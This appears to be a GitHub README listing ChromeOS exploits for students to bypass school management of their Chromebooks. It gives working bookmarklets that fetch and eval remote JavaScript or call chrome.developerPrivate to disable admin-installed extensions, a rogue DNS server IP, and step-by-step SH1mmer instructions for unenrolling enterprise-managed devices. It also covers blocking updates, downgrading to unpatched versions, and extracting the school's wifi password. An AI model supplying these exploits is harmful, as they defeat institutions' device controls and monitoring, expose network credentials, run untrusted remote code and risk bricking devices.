# EXT-REMOVER
This is a curated list of exploits for ChromeOS.   
Many of these exploits can destory your computer if used inproperly.  
  
[Echo put your shebeal  about how chromebooks are trash here]

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  

Image Credit: LittleMissNyan

<details>
<summary><b>CAUB (Prevent Updates)</b></summary>
This exploit prevents your chromebook from updating by using the Metered wifi flag. This exploit was found by Catakang#0987.  
Head to <a href="https://caub.glitch.me/">https://caub.glitch.me/</a> to use this exploit.

</details>

<details>
<summary><b>LTBEEF</b></summary>
LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore.  

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
The origional site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
  
**Instlation**  
There are several vesions of thisexploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  

    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers"
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    Set every box there to the following ip:  
    ```158.101.114.159``` (Hosted by The Greatest Giant#0110)  
    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. 
</details>  

<details>
<summary><b>Point Blank</b></summary>
Point Blank is an exploit that allows you to run bookmarklets on privilaged pages, sutch as the chrome extentions page.  
This exploit was also found by Bypassi, you can read more about how he discovered this exploit <a href="https://blog.bypassi.com/_/point-blank/"></a>

1. Bookmark this code:
```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 125);
```
2. Navigate to `chrome://extensions` 
3. Click on a extension that YOU installed from the Chrome Web Store > Details
4. In the URL bar, copy the string of letters and numbers after the `/?id=`
5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet
5. Paste the id of the extension into the prompt. 
If you close the tab, the exploit will stop working.
</details>

<details>
<summary><b>SH1mmer</b></summary>  
SH1mmer is an explit devloped by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  
This exploit can be used to completely unenroll enterprise-managed Chromebooks.  
  
**PLEASE FOLLOW EVERY DIRECTION!** If you do not, you could brick your chromebook.
  
More info: <a href="https://sh1mmer.me/">https://sh1mmer.me/</a>  
- FAQ: <a href="https://sh1mmer.me/faq.html">https://sh1mmer.me/faq.html</a>
- Credits: <a href="https://sh1mmer.me/credits.html">https://sh1mmer.me/faq.html</a>
  
This exploit works quite like downgrading, but requires a few more steps.  
<i>Requirements</i>  
- A USB with atleast 16gbs
- A personal computer

<i>Setup</i>

1. Navigate to chrome://version on the chromebook you with to downgrade and check for your board under "Platform" (ex I have a c3100 and it's board is stable-channel octopus)  
<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">  
Make sure your board is in this list: `brask, brya, clapper, coral, dedede, enguarde, glimmer, grunt, hana, hatch, jacuzzi, kukui, nami, octopus, orco, pyro, reks, sentry, stout, strongbad, tidus, ultima, volteer, zork` If it is not, then this exploit will not work.

2. - On your personal computer, download the corresponding shim from the SH1MMER file mirror <ahttps://dl.sh1mmer.me/Beautiful%20World%20GUI%20Shims>https://dl.sh1mmer.me/Beautiful World GUI Shims</a>
3. Install Chromebook Recovery Utility onto your personal computer (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en</a>  
4. Open the extention, and click on the settings button in to top right hand corner, click "use local image"  
5. Select the .bin file you downloaded

<i>Instlation</i>

1. Enter recovery mode on your Managed Chromebook. This is done by pressing the power button, reload key (↻), and esc key at the same time.
2. Press ctrl+d, then enter
3. It will now say something about "returning to secure mode" or that "OS verification is off", this means ou are ready to boot Sh1mmer. 
4. Press the power button, reload key (↻), and esc key at the same time again.
5. Plug your shimmed USB into your Chromebook, and press the power button, reload key (↻), and esc key again.
6. Navigate to "Payloads", then click on "Unenroll"
7. Nagigate back to the pain page, and click "Reboot"  
Enjoy your new, unenrolled chromebook!
</details>

<details>
<summary><b>Downgrading</b></summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for sertain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.  
   
<i>Requirements</i>
1. USB A thumb drive with at least 16gb storage
2. A personal computer with access to downloading extentions

<i>Setup</i>
1. Navigate to chrome://version on the chromebook you with to downgrade and check for your board under "Platform" (ex I have a c3100 and it's board is stable-channel octopus)  
<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">  
2. Navigate to https://chrome100.dev/ , press ctrl+f and type in your board
3. Find and download the chrome version you want to your personal computer

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en</a>  
2. Open the extention, and click on the settings button in to top right hand corner, click "use local image"  
3. Select the recovery image you downloaded from chrome100  
4. Plug in the USB you wish to use, and follow the prompts on the screen  

5. On your chromebook, press esc+reload+power and follow the prompts  
6. On the checking for updates screen, press ctrl+shift+e to skip the "checking for updates" screen  

7. Profit

</details>
  
<details>
<summary><b>Wifi Password</b></summary>  
You can get your school's wifi password if it is built into the enrolement! 

1. Navigate to <a href="https://luphoria.com/netlog-policy-password-tool">https://luphoria.com/netlog-policy-password-tool</a>
2. Follow directions on the site.

</details>